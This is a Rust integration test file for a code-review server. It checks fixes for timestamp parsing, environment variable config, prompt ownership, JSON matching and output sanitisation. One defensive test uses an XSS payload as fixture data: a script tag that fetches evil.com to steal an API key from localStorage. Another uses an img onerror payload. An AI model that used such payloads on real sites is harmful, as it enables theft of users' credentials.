//! Integration tests for bug fixes.
//!
//! These tests demonstrate the bugs identified in code review and verify fixes.

use sqlx::SqlitePool;

/// Helper to create an in-memory database with migrations.
async fn setup_db() -> SqlitePool {
    let pool = SqlitePool::connect("sqlite::memory:")
        .await
        .expect("Failed to create in-memory database");

    sqlx::migrate!("./migrations")
        .run(&pool)
        .await
        .expect("Failed to run migrations");

    pool
}

/// Test module for timestamp format issues.
///
/// Bug: SQLite's datetime('now') produces "YYYY-MM-DD HH:MM:SS" format,
/// but the code parses with parse_from_rfc3339 expecting "YYYY-MM-DDTHH:MM:SSZ".
mod timestamp_format {
    use super::*;

    #[tokio::test]
    async fn datetime_now_format_should_be_parseable() {
        // This test demonstrates the bug: records created with SQLite's
        // datetime('now') default cannot be parsed by the Rust code.
        let pool = setup_db().await;

        // Insert a repo using SQLite's datetime('now') default
        // (simulating what the migration schema does)
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name)
            VALUES ('https://github.com/test/repo', 'test', 'repo')
            "#,
        )
        .execute(&pool)
        .await
        .expect("Insert should succeed");

        // Try to read it back via the domain layer
        use panopticon_server::db::repos;
        use panopticon_server::domain::ids::RepoId;

        let result = repos::get_by_id(&pool, RepoId::new(1)).await;

        // BUG: This should succeed but will fail due to datetime format mismatch
        // The parse_from_rfc3339 will fail on "2024-01-15 10:30:00" format
        assert!(
            result.is_ok(),
            "Should parse datetime('now') format: {:?}",
            result
        );
        let repo = result.unwrap();
        assert!(repo.is_some(), "Repo should exist");
    }

    #[tokio::test]
    async fn review_timestamps_should_roundtrip() {
        let pool = setup_db().await;

        // Create a repo first (using SQLite's datetime format to test compatibility)
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/repo', 'test', 'repo', datetime('now'))
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create a review using the DB layer (writes RFC3339)
        use panopticon_server::db::reviews;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::repo::CommitSha;
        use panopticon_server::domain::review::{NewReview, ReviewTrigger};

        // Use a valid 40-character hex SHA
        let sha = CommitSha::parse("abcdef1234567890abcdef1234567890abcdef12")
            .expect("Valid 40-char hex SHA");

        let new_review = NewReview {
            repo_id: RepoId::new(1),
            commit_sha: sha,
            trigger: ReviewTrigger::Manual,
        };

        let review = reviews::create(&pool, new_review).await;

        // This should now succeed with the datetime format fix
        assert!(
            review.is_ok(),
            "Review creation should succeed: {:?}",
            review
        );
    }

    #[tokio::test]
    async fn job_scheduled_at_comparison_should_work() {
        // Bug: Jobs write scheduled_at as RFC3339 but claim_next compares
        // scheduled_at <= datetime('now') which uses different format
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job scheduled for now
        let new_job = NewJob::review_repo(RepoId::new(1), false);
        let job = jobs::create(&pool, new_job).await.expect("Job creation");

        // Try to claim it immediately
        let claimed = jobs::claim_next(&pool).await;

        // BUG: This may fail because we're comparing RFC3339 scheduled_at
        // with datetime('now') which produces a different format.
        // String comparison of "2024-01-15T10:30:00Z" vs "2024-01-15 10:30:00"
        // will not work correctly.
        assert!(claimed.is_ok(), "Claim should succeed: {:?}", claimed);
        let claimed = claimed.unwrap();
        assert!(claimed.is_some(), "Job should be claimed immediately");
    }
}

/// Test module for environment variable parsing.
///
/// The fix uses double underscore (__) as separator so that single underscores
/// in key names are preserved. PANOPTICON__LLM__PROVIDER__API_KEY becomes
/// llm.provider.api_key correctly.
mod env_parsing {
    use std::env;

    #[test]
    fn underscore_in_key_should_be_preserved() {
        // Set up environment variables with double underscore separator
        // The type value must match serde's rename (open_ai from OpenAi)
        env::set_var("PANOPTICON__LLM__PROVIDER__API_KEY", "test-key-123");
        env::set_var("PANOPTICON__LLM__PROVIDER__TYPE", "open_ai");
        env::set_var("PANOPTICON__AUTH__API_KEY", "auth-key-456");

        use panopticon_server::config::AppConfig;

        // With separator("__"), this should work:
        // PANOPTICON__LLM__PROVIDER__API_KEY becomes llm.provider.api_key
        let result = AppConfig::load();

        // Clean up
        env::remove_var("PANOPTICON__LLM__PROVIDER__API_KEY");
        env::remove_var("PANOPTICON__LLM__PROVIDER__TYPE");
        env::remove_var("PANOPTICON__AUTH__API_KEY");

        assert!(result.is_ok(), "Config should load: {:?}", result);

        let config = result.unwrap();
        match &config.llm.provider {
            panopticon_server::config::LlmProviderConfig::OpenAi { api_key, .. } => {
                assert_eq!(
                    api_key, "test-key-123",
                    "API key should be parsed correctly"
                );
            }
        }
    }
}

/// Test module for prompt ownership verification.
///
/// The fix uses get_by_id_and_repo to verify the prompt belongs to the repo.
mod prompt_ownership {
    use super::*;

    #[tokio::test]
    async fn get_by_id_and_repo_enforces_ownership() {
        let pool = setup_db().await;

        // Create two repos
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES
                ('https://github.com/owner1/repo1', 'owner1', 'repo1', '2024-01-01T00:00:00Z'),
                ('https://github.com/owner2/repo2', 'owner2', 'repo2', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create a prompt for repo 1
        sqlx::query(
            r#"
            INSERT INTO prompts (repo_id, name, text, created_at)
            VALUES (1, 'Test Prompt', 'Review the code', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::prompts;
        use panopticon_server::domain::ids::{PromptId, RepoId};

        // With get_by_id_and_repo, we can verify ownership
        // Prompt 1 should be found when querying with repo 1
        let result = prompts::get_by_id_and_repo(&pool, PromptId::new(1), RepoId::new(1)).await;
        assert!(result.is_ok());
        assert!(result.unwrap().is_some(), "Prompt should exist in repo 1");

        // Prompt 1 should NOT be found when querying with repo 2 (wrong repo)
        let result = prompts::get_by_id_and_repo(&pool, PromptId::new(1), RepoId::new(2)).await;
        assert!(result.is_ok());
        assert!(
            result.unwrap().is_none(),
            "Prompt should not be accessible via repo 2"
        );
    }
}

/// Test module for JSON payload matching.
///
/// Bug: has_pending_review uses LIKE '%"repo_id":N%' which matches
/// repo_id 1 when searching for 10 (false positive).
mod json_matching {
    use super::*;

    #[tokio::test]
    async fn repo_id_matching_should_be_exact() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job for repo_id 10
        let job = NewJob::review_repo(RepoId::new(10), false);
        jobs::create(&pool, job).await.unwrap();

        // Check if repo_id 1 has pending reviews
        let has_pending_1 = jobs::has_pending_review(&pool, RepoId::new(1))
            .await
            .unwrap();

        // BUG: This returns true because LIKE '%"repo_id":1%' matches
        // the payload containing '"repo_id":10'
        assert!(
            !has_pending_1,
            "Repo 1 should NOT have pending reviews (repo 10 does)"
        );
    }

    #[tokio::test]
    async fn repo_id_100_should_not_match_repo_id_10() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job for repo_id 100
        let job = NewJob::review_repo(RepoId::new(100), false);
        jobs::create(&pool, job).await.unwrap();

        // Check if repo_id 10 has pending reviews
        let has_pending_10 = jobs::has_pending_review(&pool, RepoId::new(10))
            .await
            .unwrap();

        // BUG: LIKE '%"repo_id":10%' will match '"repo_id":100'
        assert!(
            !has_pending_10,
            "Repo 10 should NOT have pending reviews (repo 100 does)"
        );
    }
}

/// Test module for max_tokens.
///
/// Bug: LlmRequest.max_tokens is defined but ignored by OpenAI provider.
mod max_tokens {
    use panopticon_server::llm::provider::LlmRequest;

    #[test]
    fn llm_request_has_max_tokens() {
        // Verify the field exists and can be set
        let request = LlmRequest {
            system_prompt: "You are a reviewer".to_string(),
            user_prompt: "Review this code".to_string(),
            max_tokens: 4096,
        };

        assert_eq!(request.max_tokens, 4096);
        // Note: We can't easily test that OpenAI actually uses this
        // without mocking the HTTP client. The fix is verified by code review.
    }
}

/// Test module for UntrustedString type.
///
/// These tests verify that LLM output cannot be rendered without sanitization.
mod untrusted_string {
    use panopticon_server::domain::untrusted::UntrustedString;

    #[test]
    fn xss_payload_should_be_sanitized() {
        // The LLM could return malicious content that would execute in the browser.
        let malicious_llm_output = r#"<script>fetch('https://evil.com?key='+localStorage.getItem('panopticon_api_key'))</script>"#;

        // Wrap in UntrustedString (as would happen when parsing LLM response)
        let untrusted = UntrustedString::new(malicious_llm_output);

        // When sanitized, the output should be escaped
        let sanitized = untrusted.sanitize_html();

        // Verify XSS payload is neutralized
        assert!(
            !sanitized.contains("<script>"),
            "Script tags should be escaped"
        );
        assert!(
            sanitized.contains("&lt;script&gt;"),
            "Escaped script tags should be present"
        );
    }

    #[test]
    fn markdown_with_html_should_be_safe() {
        // Even markdown rendering should not allow raw HTML
        let malicious_markdown = r#"# Normal Header
<img src=x onerror="alert('XSS')">

Normal text with `code`"#;

        let untrusted = UntrustedString::new(malicious_markdown);

        // render_markdown_safe escapes HTML before rendering markdown
        let rendered = untrusted.render_markdown_safe();

        assert!(
            !rendered.contains("<img"),
            "HTML img tags should be escaped"
        );
        assert!(
            rendered.contains("&lt;img"),
            "Escaped img tag should be present"
        );
    }

    #[test]
    fn untrusted_string_prevents_accidental_display() {
        // UntrustedString intentionally does not implement Display
        // to prevent accidental use in format! or println!
        let untrusted = UntrustedString::new("test");

        // This should not compile: format!("{}", untrusted)
        // But as_raw() allows explicit access
        assert_eq!(untrusted.as_raw(), "test");
    }
}

/// Test module for SSE streaming.
///
/// Bug: The SSE stream closes on prompt_complete events, but multi-prompt
/// reviews will have multiple prompt_complete events before the final one.
mod sse_streaming {
    // Note: Full SSE testing requires an HTTP client and server setup.
    // This module documents the expected behavior.

    #[test]
    fn prompt_complete_should_not_close_stream() {
        // Document the expected behavior:
        // - SSE stream should stay open after prompt_complete
        // - Only close on "complete" event (all prompts done) or "failed"
        //
        // The fix should ensure that:
        // 1. Multiple prompts can complete without closing the stream
        // 2. Only the final "complete" event closes the stream
    }
}
